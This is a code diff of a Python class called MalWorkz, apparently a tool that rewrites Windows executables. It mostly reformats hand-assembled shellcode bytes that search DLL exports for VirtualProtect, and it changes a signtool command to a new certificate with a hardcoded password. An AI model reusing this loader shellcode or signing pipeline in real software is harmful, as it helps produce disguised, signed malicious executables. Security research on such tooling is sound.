@@ -212,16 +212,16 @@ class MalWorkz:
 
         # Loop through function names and locate VirtualProtect
         # LoopDLLFunctions:
-        buf += b"\x8B\x75\xEC"  # mov esi, [ebp - 14h]
-        buf += b"\x8B\x7D\xF8"  # mov edi, [ebp - 08h]
-        buf += b"\x8B\x3C\x9F"  # mov edi, [edi + ebx * 4]
-        buf += b"\x03\xF8"  # add edi, eax
+        buf += b"\x8B\x75\xEC"      # mov esi, [ebp - 14h]
+        buf += b"\x8B\x7D\xF8"      # mov edi, [ebp - 08h]
+        buf += b"\x8B\x3C\x9F"      # mov edi, [edi + ebx * 4]
+        buf += b"\x03\xF8"          # add edi, eax
         buf += b"\x66\xB9\x0B\x00"  # mov cx, 11 (Compare first 11 bytes)
-        buf += b"\xF3\xA6"  # repe cmpsb
-        buf += b"\x74\x06"  # jz SetUpVirtualProtectCall
-        buf += b"\x43"  # inc ebx
-        buf += b"\x3B\x5D\xFC"  # cmp ebx, [ebp - 4h]
-        buf += b"\x75\xE7"  # jne LoopDLLFunctions
+        buf += b"\xF3\xA6"          # repe cmpsb
+        buf += b"\x74\x06"          # jz SetUpVirtualProtectCall
+        buf += b"\x43"              # inc ebx
+        buf += b"\x3B\x5D\xFC"      # cmp ebx, [ebp - 4h]
+        buf += b"\x75\xE7"          # jne LoopDLLFunctions
 
         # SetUpVirtualProtectCall:
         buf += b"\x8B\x4D\xF4"  # mov ecx, [ebp - 0ch]   (Ordinal table)
@@ -524,7 +524,7 @@ class MalWorkz:
 
     def sign_exe(self):
         try:
-            command = "signtool sign /f MalWorkz/mycert.pfx /p MyPassword /fd SHA256 {}".format(
+            command = "signtool sign /f MalWorkz/malworkzcert.pfx /p qwerty123 /fd SHA256 {}".format(
                 self.new_pe_name
             )
             subprocess.check_call(
@@ -692,6 +692,7 @@ class MalWorkz:
         random_file_name = str(time.time())
         self.pe.write("temp/{}".format(random_file_name))
         self.pe.close()
+        
         with open("temp/{}".format(random_file_name), "rb+") as f:
             ba = bytearray(f.read())
             f.close()
@@ -702,7 +703,7 @@ class MalWorkz:
         with open("temp/{}".format(random_file_name), "wb+") as f:
             f.write(ba)
             f.close()
-
+        
         self.pe = pefile.PE("temp/{}".format(random_file_name))
 
     def write(self):
